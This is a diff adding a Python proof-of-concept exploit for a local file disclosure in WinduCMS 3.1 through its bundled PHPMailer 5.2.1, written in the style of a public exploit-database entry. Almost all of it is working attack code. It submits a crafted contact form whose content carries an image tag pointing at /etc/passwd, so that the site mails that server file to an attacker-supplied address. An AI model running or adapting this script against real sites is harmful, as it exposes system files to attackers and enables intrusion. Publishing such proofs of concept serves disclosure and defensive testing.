@@ -1,0 +1,36 @@
+#!/usr/bin/python
+#
+# Exploit Title: WinduCMS <= 3.1 - Local File Disclosure
+# Date: 2017-12-03
+# Exploit Author: Maciek Krupa
+# Vendor Homepage: http://windu.org
+# Version: 3.1
+# Tested on: Linux Debian 9
+#
+# // Description //
+#   
+# Local File Disclosure vulnerability exists in WinduCMS through a vulnerable PHPMailer version 5.2.1 used here
+# 
+# // PoC //
+#
+# It requires a contact form present on the website
+#
+# Example: {{W name=contactForm inputs="name" email="root@localhost"}}
+#
+
+from requests_toolbelt import MultipartEncoder
+import requests
+
+print("WinduCMS <= 3.1 Exploit")
+ 
+url = 'http://localhost/contact_page?mn=contactform.message.negative'
+email = 'attacker@example.com'
+payload = '<img src="/etc/passwd"'
+form_input = 'name'
+fields = {'form_key': 'contactForm', form_input: 'Attacker', 'email': email, 'content': payload}
+m = MultipartEncoder(fields=fields, boundary='----WebKitFormBoundary1500777958139315')
+headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'Content-Type': m.content_type}
+print('Sending payload to target...')
+r = requests.post(url, data=m.to_string(), headers=headers)
+if r.status_code == 200:
+	print('Exploited.')
